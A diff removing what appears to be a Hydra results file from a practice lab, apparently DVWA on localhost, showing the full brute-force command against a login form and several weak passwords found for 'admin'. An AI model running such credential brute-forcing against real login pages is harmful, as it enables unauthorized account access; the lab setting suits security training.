@@ -1,7 +1,0 @@
-# Hydra v9.5 run at 2024-11-11 14:19:29 on localhost http-post-form (hydra -l admin -P passwords.txt -s 89 -o results.txt localhost http-post-form /vulnerabilities/brute/:username=^USER^&password=^PASS^:Invalid login)
-[89][http-post-form] host: localhost   login: admin   password: password
-[89][http-post-form] host: localhost   login: admin   password: password
-[89][http-post-form] host: localhost   login: admin   password: admin
-[89][http-post-form] host: localhost   login: admin   password: 123456
-[89][http-post-form] host: localhost   login: admin   password: password123
-[89][http-post-form] host: localhost   login: admin   password: letmein
